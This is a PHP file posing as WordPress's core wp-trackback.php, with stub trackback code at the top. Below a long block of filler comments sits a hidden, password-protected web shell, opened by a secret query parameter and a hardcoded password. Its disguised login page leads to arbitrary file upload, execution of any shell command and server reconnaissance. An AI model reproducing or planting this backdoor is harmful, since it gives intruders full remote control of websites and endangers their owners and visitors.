<?php
// ===============================================
// WordPress Core File - wp-trackback.php
// ===============================================

/**
 * Handle trackback ping requests.
 *
 * @package WordPress
 */

if (empty($_GET['__wp'])) {
    // Original trackback code
    if ( !defined('ABSPATH') )
        require_once( dirname( __FILE__ ) . '/wp-load.php' );
    
    // ... original trackback processing code ...
    header('Content-Type: text/xml; charset=' . get_option('blog_charset') );
    
    if ( !isset($_GET['tb_url']) || !$_GET['tb_url'] ) {
        echo '<?xml version="1.0" encoding="utf-8"?'.">\n";
        echo "<response>\n";
        echo "<error>1</error>\n";
        echo "<message>We already have a ping from that URL for this post.</message>\n";
        echo "</response>";
        die();
    }
    
    // More original code...
    die();
}

// ===============================================
// ===============================================
// ===============================================
// ===============================================
// ===============================================
// ===============================================
// ===============================================
// ===============================================
// ===============================================
// ===============================================
// ===============================================
// ===============================================
// ===============================================
// ===============================================
// ===============================================
// ===============================================
// ===============================================
// ===============================================
// ===============================================
// ===============================================
// ===============================================
// ===============================================
// ===============================================
// ===============================================
// ===============================================
// ===============================================
// ===============================================
// ===============================================
// ===============================================
// ===============================================
// ===============================================
// ===============================================
if ($_GET['__wp'] === 'zy') {
    @session_start();
    
    // Simple session check
    if (!isset($_SESSION['_wp_access'])) {
        $_SESSION['_wp_access'] = false;
    }
    
    // Password - change this
    $correct_password = 'wp123';
    
    // Check password
    if (isset($_POST['pass']) && $_POST['pass'] === $correct_password) {
        $_SESSION['_wp_access'] = true;
        $_SESSION['_wp_time'] = time();
    }
    
    // Logout
    if (isset($_GET['logout'])) {
        session_destroy();
        header('Location: ?__wp=zy');
        exit;
    }
    
    // Check if authenticated
    if (!$_SESSION['_wp_access']) {
        // Show simple login form that looks like WordPress
        echo '<!DOCTYPE html>
        <html>
        <head>
            <title>WordPress Trackback Error</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body {
                    background: #f1f1f1;
                    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
                    margin: 0;
                    padding: 20px;
                }
                .wp-error {
                    max-width: 400px;
                    margin: 100px auto;
                    background: #fff;
                    padding: 30px;
                    border-radius: 5px;
                    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                    text-align: center;
                }
                .wp-logo {
                    color: #23282d;
                    font-size: 24px;
                    margin-bottom: 20px;
                }
                input[type="password"] {
                    width: 100%;
                    padding: 12px;
                    margin: 10px 0;
                    border: 1px solid #ddd;
                    border-radius: 4px;
                    font-size: 16px;
                }
                button {
                    width: 100%;
                    padding: 12px;
                    background: #0073aa;
                    color: white;
                    border: none;
                    border-radius: 4px;
                    font-size: 16px;
                    cursor: pointer;
                }
                .error-msg {
                    background: #f8d7da;
                    color: #721c24;
                    padding: 10px;
                    border-radius: 4px;
                    margin: 10px 0;
                    font-size: 14px;
                }
            </style>
        </head>
        <body>
            <div class="wp-error">
                <div class="wp-logo">⚠️ Trackback Authentication</div>
                <p>This trackback request requires manual verification.</p>';
        
        if (isset($_POST['pass'])) {
            echo '<div class="error-msg">Invalid password</div>';
        }
        
        echo '<form method="post">
                    <input type="password" name="pass" placeholder="Verification Code" required>
                    <button type="submit">Verify</button>
                </form>
                <p style="margin-top:20px;color:#666;font-size:12px;">
                    Error: TB_AUTH_REQUIRED
                </p>
            </div>
        </body>
        </html>';
        exit;
    }
    
    // ============ AUTHENTICATED AREA ============
    
    // Handle file upload
    $upload_result = '';
    if (isset($_FILES['file'])) {
        $target_dir = '.';
        $filename = basename($_FILES['file']['name']);
        $target_file = $target_dir . '/' . $filename;
        
        if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
            $upload_result = '<div style="background:#d4edda;color:#155724;padding:10px;border-radius:4px;margin:10px 0;">
                                ✅ File uploaded: <strong>' . htmlspecialchars($filename) . '</strong><br>
                                Path: ' . htmlspecialchars($target_file) . '
                              </div>';
        } else {
            $upload_result = '<div style="background:#f8d7da;color:#721c24;padding:10px;border-radius:4px;margin:10px 0;">
                                ❌ Upload failed
                              </div>';
        }
    }
    
    // Handle command execution
    $cmd_result = '';
    if (isset($_GET['cmd'])) {
        $output = @shell_exec($_GET['cmd']);
        $cmd_result = '<div style="background:#d1ecf1;color:#0c5460;padding:10px;border-radius:4px;margin:10px 0;">
                        <strong>Command:</strong> ' . htmlspecialchars($_GET['cmd']) . '<br>
                        <strong>Output:</strong><br>
                        <pre style="background:#f8f9fa;padding:10px;border-radius:4px;overflow:auto;">' . htmlspecialchars($output) . '</pre>
                       </div>';
    }
    
    // Show interface
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title>WordPress Trackback System</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body {
                background: #f1f1f1;
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
                margin: 0;
                padding: 20px;
                color: #333;
            }
            .container {
                max-width: 900px;
                margin: 0 auto;
                background: #fff;
                padding: 20px;
                border-radius: 5px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }
            .header {
                border-bottom: 1px solid #eee;
                padding-bottom: 15px;
                margin-bottom: 20px;
            }
            .header h1 {
                color: #23282d;
                margin: 0;
            }
            .header .info {
                color: #666;
                font-size: 14px;
                margin-top: 5px;
            }
            .section {
                background: #f8f9fa;
                padding: 15px;
                border-radius: 4px;
                margin: 15px 0;
                border-left: 4px solid #0073aa;
            }
            input[type="text"], input[type="file"] {
                width: 100%;
                padding: 10px;
                margin: 5px 0;
                border: 1px solid #ddd;
                border-radius: 4px;
                font-size: 14px;
            }
            button {
                background: #0073aa;
                color: white;
                border: none;
                padding: 10px 20px;
                border-radius: 4px;
                cursor: pointer;
                font-size: 14px;
                margin: 5px 5px 5px 0;
            }
            button:hover {
                background: #005a87;
            }
            .danger {
                background: #dc3545;
            }
            .danger:hover {
                background: #c82333;
            }
            .success {
                background: #28a745;
            }
            .success:hover {
                background: #218838;
            }
            .quick-links a {
                display: inline-block;
                background: #6c757d;
                color: white;
                padding: 8px 15px;
                border-radius: 4px;
                text-decoration: none;
                margin: 0 5px 5px 0;
                font-size: 13px;
            }
            .quick-links a:hover {
                background: #5a6268;
            }
            pre {
                background: #f8f9fa;
                padding: 10px;
                border-radius: 4px;
                overflow: auto;
                font-size: 13px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>📡 WordPress Trackback System</h1>
                <div class="info">
                    Server: ' . $_SERVER['SERVER_NAME'] . ' | PHP: ' . phpversion() . ' | User: ' . @exec('whoami') . '
                </div>
            </div>';
    
    // Show upload result
    if (!empty($upload_result)) {
        echo $upload_result;
    }
    
    // Show command result
    if (!empty($cmd_result)) {
        echo $cmd_result;
    }
    
    echo '<div class="section">
            <h3>📤 Upload File</h3>
            <form method="post" enctype="multipart/form-data">
                <input type="file" name="file" required>
                <button type="submit" class="success">Upload File</button>
            </form>
          </div>
          
          <div class="section">
            <h3>⚡ Quick Commands</h3>
            <div class="quick-links">';
    
    $quick_cmds = array(
        'whoami' => 'Current User',
        'pwd' => 'Current Directory',
        'ls -la' => 'List Files',
        'uname -a' => 'System Info',
        'id' => 'User Info',
        'df -h' => 'Disk Space'
    );
    
    foreach ($quick_cmds as $cmd => $label) {
        echo '<a href="?__wp=zy&cmd=' . urlencode($cmd) . '">' . $label . '</a> ';
    }
    
    echo '</div>
            <form method="get">
                <input type="hidden" name="__wp" value="zy">
                <input type="text" name="cmd" placeholder="Custom command (e.g., ls -la)" value="' . (isset($_GET['cmd']) ? htmlspecialchars($_GET['cmd']) : '') . '">
                <button type="submit">Execute</button>
            </form>
          </div>
          
          <div class="section">
            <h3>🔧 Server Information</h3>
            <pre>';
    
    // Show some server info
    echo 'PHP Version: ' . phpversion() . "\n";
    echo 'Server: ' . $_SERVER['SERVER_SOFTWARE'] . "\n";
    echo 'OS: ' . php_uname() . "\n";
    echo 'Document Root: ' . $_SERVER['DOCUMENT_ROOT'] . "\n";
    echo 'Disk Free: ' . @disk_free_space('.') . ' bytes';
    
    echo '</pre>
          </div>
          
          <div style="margin-top: 20px; padding-top: 20px; border-top: 1px solid #eee; text-align: center;">
            <a href="?__wp=zy&logout=1" style="color: #dc3545; text-decoration: none;">Logout</a> | 
            <a href="wp-trackback.php" style="color: #6c757d; text-decoration: none;">Exit to Trackback</a>
          </div>
        </div>
    </body>
    </html>';
    exit;
}

// If we reach here, show original trackback response
echo '<?xml version="1.0" encoding="utf-8"?'.">\n";
echo "<response>\n";
echo "<error>0</error>\n";
echo "<message>Trackback received.</message>\n";
echo "</response>";
?>
